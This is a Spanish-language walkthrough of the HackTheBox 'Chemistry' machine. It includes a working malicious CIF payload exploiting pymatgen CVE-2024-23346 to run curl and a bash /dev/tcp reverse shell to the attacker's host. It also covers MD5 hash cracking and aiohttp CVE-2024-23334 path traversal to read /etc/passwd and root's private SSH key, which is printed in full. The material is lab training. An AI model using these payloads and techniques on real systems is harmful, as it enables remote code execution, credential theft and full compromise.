Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #port-forwarding #CVE-2024-23334 #cif #aiohttp #CVE-2024-23346 #lfi

![](assets/Pasted%20image%2020251229123956.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

- ttl 63 -> maquina linux.

```bash
> ping -c 1 10.129.231.170
PING 10.129.231.170 (10.129.231.170) 56(84) bytes of data.
64 bytes from 10.129.231.170: icmp_seq=1 ttl=63 time=85.7 ms

--- 10.129.231.170 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 85.711/85.711/85.711/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos estan abiertos.

```bash
> sudo nmap -p- -Pn -n -vv -sS --min-rate 5000 10.129.231.170 -oG nmap/allPorts

Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```

- Puertos 22 SSH y 5000 upnp abiertos.

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,5000 -sC -sV -Pn -n -vv --min-rate 5000 10.129.231.170 -oN nmap/target

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Puerto 5000 HTTP: Werkzeug httpd 3.0.3/Python


## Enumeración


### Puerto 5000 HTTP

La web es una herramienta para analizar archivos CIF.

![](assets/Pasted%20image%2020251229124546.png)

Me cree una cuenta para acceder a la pagina:

![](assets/Pasted%20image%2020251229124826.png)

Al momento de entrar podemos ver que tenemos la capacidad de subir archivos CIF y verlos desde la web.

![](assets/Pasted%20image%2020251229133648.png)

**Tecnologias Web.**

Viendo los headers podemos confirmar la presencia de `Python/3.9.5`

```bash
> curl -I http://10.129.231.170:5000

HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.5
Date: Mon, 29 Dec 2025 18:54:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 719
Vary: Cookie
Connection: close
```

**Fuzzing de Directorios.**

Aplicamos fuzzing con `ffuf` para descubrir posibles recursos ocultos, pero no encontramos nada que no se vea desde la web.

```bash
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.231.170:5000/FUZZ -e .git,.py,.html,.txt,.xml -c -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.231.170:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .git .py .html .txt .xml
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 102ms]
login                   [Status: 200, Size: 926, Words: 226, Lines: 29, Duration: 87ms]
register                [Status: 200, Size: 931, Words: 226, Lines: 29, Duration: 87ms]
upload                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 89ms]
logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 96ms]
dashboard               [Status: 302, Size: 235, Words: 18, Lines: 6, Duration: 95ms]
```


## Explotación

Sin mucha mas informacion busque en internet `Python Cif` y me encontré el siguiente [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f). Al parecer la vulnerabilidad existe gracias al uso de `eval()` y `__builtins__`.

Aunque `eval()` se ejecute con `__builtins__ = None`, cualquier objeto todavía expone métodos _under_ (`__class__`, `__mro__`, `__subclasses__`).  
Con ellos se puede **subir por la jerarquía de clases hasta `object`** y desde ahí **listar todas las clases cargadas**, incluyendo importadores internos como `BuiltinImporter`.

En el repositorio de GitHub nos comparten el siguiente payload `vuln.cif`:

- Modifique el payload para realizar petición con `curl` a mi maquina atacante.

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.15.110");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Ahora voy a levantar un servidor en python para que me llegue la petición.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Subo el payload.

![](assets/Pasted%20image%2020251229133507.png)

Y  al momento de darle a **view** me llega la petición a mi maquina.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.170 - - [29/Dec/2025 13:35:37] "GET / HTTP/1.1" 200 -
```

Por lo cual ahora puedo tratar de entablarme una reverse-shell.

- Me puse en escucha por el puerto 443

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
```

- Y Modifique el payload para lanzar una reverse-shell.

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.110/443 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

- Subí el archivo y al momento de darle a view me llego la conexión

![](assets/Pasted%20image%2020251229135203.png)


```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
whoami
connect to [10.10.15.110] from (UNKNOWN) [10.129.231.170] 48372
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ whoami
app
app@chemistry:~$
```

## Escalada de Privilegios

Primero le echo un vistazo al `/etc/passwd` para ver que usuarios existen.

```bash
app@chemistry:~$ grep "sh" /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

- Aparte del root existe un usuario rosa.

Dentro del sistema me topo con el archivo `app.py` que corresponde al codigo de la pagina, y me encuentro con lo siguiente

```bash
app@chemistry:~$ ls
app.py  instance  static  templates  uploads

app@chemistry:~$ cat app.py

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```

- La app esta utilizando una base de datos `sqlite`
- También podemos ver una clave **MyS3cretCh3mistry4PP**

La base de datos se encontraba en el directorio **~/instance**

```bash
app@chemistry:~/instance$ ls
database.db
```

Abrí la base de datos con `sqlite3` para empezar a enumerarla

```sql
app@chemistry:~/instance$ sqlite3 database.db
SQLite version 3.31.1 2020-01-27 19:55:54
sqlite> .tables
structure  user
sqlite> SELECT * from user
   ...> ;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|pepe|c9f95a0a5af052bffce5c89917335f67
```

- Podemos ver una tabla `user` que contiene usuarios y contraseñas.

Podemos ver el hash del usuario **rosa**, por lo cual podemos tratar de crackearlo.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ hashcat -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```

- Credenciales **rosa:unicorniosrosados**

Ahora podemos migrar al usuario `rosa`

```bash
app@chemistry:~/instance$ su rosa
Password:
rosa@chemistry:/home/app/instance$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
```

## Escalada a root

Enumere los puertos locales.

```bash
rosa@chemistry:/dev/shm$ ss -nltp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
LISTEN    0         128                0.0.0.0:5000             0.0.0.0:*        users:(("ss",pid=1134235,fd=4),("xxd",pid=1077894,fd=4),("dd",pid=1077893,fd=4),("bash",pid=1077887,fd=4),("grep",pid=1077886,fd=4),("bash",pid=1077885,fd=4),("bash",pid=1077882,fd=4),("bash",pid=975335,fd=4))
LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
LISTEN    0         128                   [::]:22                  [::]:*
```

- Hay un servicio corriendo en el puerto 8080

Le tire un curl para ver si era una web y efectivamente lo es.

```bash
rosa@chemistry:/dev/shm$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }
```

### Port Forwarding y Enumeracion

Sabiendo que es una web, puedo realizar **Port Forwarding** para poder acceder a ella desde mi host:

- credenciales **rosa:unicorniosrosados**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/scripts]
└─$ ssh -L 8081:127.0.0.1:8080 rosa@10.129.231.170
```

- Voy a acceder a la web por mi puerto 8081.

La web es una dashboard de ventas o algo asi

![](assets/Pasted%20image%2020251229143539.png)

Tiene varias tabs entre ellas la que muestra servicios corriendo:

![](assets/Pasted%20image%2020251229143610.png)

**Tecnologias Web.**

Por los headers de la web podemos ver que corre sobre `Python` y `aiohttp 3.9.1`

```bash
> curl http://localhost:8081/ -I

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Mon, 29 Dec 2025 20:29:25 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Una búsqueda por internet por vulnerabilidades para la version `3.9.1` de `aiohttp` me lleva al siguiente [CVE-2024-23334](https://security.snyk.io/vuln/SNYK-DEBIAN13-PYTHONAIOHTTP-6210121)

!!! info
**aiohttp** es un framework HTTP asíncrono para Python. Al configurarlo como servidor web, se define una ruta raíz para servir archivos estáticos. La opción `follow_symlinks` controla si se permiten enlaces simbólicos. Cuando `follow_symlinks` está en `true`, no se valida que los archivos solicitados permanezcan dentro del directorio raíz, lo que permite ataques de **Path Traversal** y la lectura de archivos arbitrarios del sistema.

Si fuzzeamos para descubrir la ruta de los archivos estáticos nos vamos a dar cuenta que es `assets`

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/scripts]
└─$ ffuf -u http://localhost:8081/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -e .py,.html,.txt

assets                  [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 174ms]
```

Ahora que conocemos la ruta donde se sirven los archivos estáticos (`/assets`), podemos intentar explotar una vulnerabilidad de _path traversal_ utilizando `curl` con la opción `--path-as-is`, evitando que la ruta sea normalizada por el cliente y permitiendo al backend procesar las secuencias `../`.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/scripts]
└─$ curl --path-as-is http://localhost:8081/assets/../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
<MAS.........>
```

- Podemos ver que en efecto podemos listar archivos

Ahora voy a tratar de apuntar a la clave `ssh` del root.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/scripts]
└─$ curl --path-as-is http://localhost:8081/assets/../../../root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- Me guardo la clave y le doy permisos 

Ahora que tengo la clave me puedo conectar por ssh

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ chmod 600 id_rsa

┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/chemistry/content]
└─$ ssh -i id_rsa root@10.129.231.170

Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# export TERM=xterm
```

Flags

```bash
root@chemistry:~# cat root.txt
ca75a15cb5cfe54f********
root@chemistry:~# cat /home/rosa/user.txt
e72e650e69f********
```

***PWNED***

![](assets/Pasted%20image%2020251229150820.png)
